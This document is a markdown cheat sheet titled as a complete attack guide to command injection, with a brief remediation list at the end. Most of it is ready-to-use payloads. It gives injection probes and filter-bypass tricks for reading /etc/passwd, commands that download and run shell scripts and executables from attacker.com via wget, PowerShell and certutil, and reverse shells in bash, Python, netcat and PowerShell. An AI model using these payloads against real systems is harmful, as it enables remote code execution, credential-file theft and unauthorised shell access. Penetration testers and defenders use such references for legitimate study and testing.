# Command Injection — Complete Attack Guide

## 1. Detection

### Basic Injection
```
; id
| id
|| id
&& id
`id`
$(id)
```

### Chaining
```
; id #
| id |
|| id || echo
&& id &&
;id;#
```

## 2. Bypass Techniques

### 2.1 Space Bypass
```
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat<>/etc/passwd
X=$'\x20';cat${X}/etc/passwd
```

### 2.2 Quote Bypass
```
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
```

### 2.3 Wildcard Bypass
```
cat /etc/p?sswd
cat /etc/pass*
cat /etc/[p]asswd
```

### 2.4 Variable Expansion
```
${PATH:0:1}  → /
${HOME:0:1}  → /
${SHELL:0:1} → /
```

### 2.5 Hex/Octal Encoding
```
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | xargs cat
echo -e "\057\145\164\143\057\160\141\163\163\167\144" | xargs cat
```

### 2.6 Base64
```
echo L2V0Yy9wYXNzd2Q= | base64 -d | xargs cat
```

## 3. Platform-Specific

### Linux
```
; cat /etc/passwd
| wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh
; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### Windows
```
; type C:\Windows\win.ini
| powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
; certutil -urlcache -split -f http://attacker.com/shell.exe C:\Temp\shell.exe && C:\Temp\shell.exe
```

## 4. Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/attacker/4444 0>&1
```

### Python
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Netcat
```bash
nc -e /bin/sh attacker 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f
```

### PowerShell
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## 5. Tools

### Commix
```bash
commix --url="http://target/cmd?input=test"
commix --url="http://target/cmd" --data="input=test"
```

### nuclei
```bash
nuclei -u http://target -tags command-injection
```

## 6. Remediation

1. **Never pass user input to system commands** — Use safe APIs
2. **Input validation** — Whitelist allowed characters
3. **Escaping** — Use `shlex.quote()` (Python), `escapeshellarg()` (PHP)
4. **Parameterized commands** — Use subprocess with list arguments
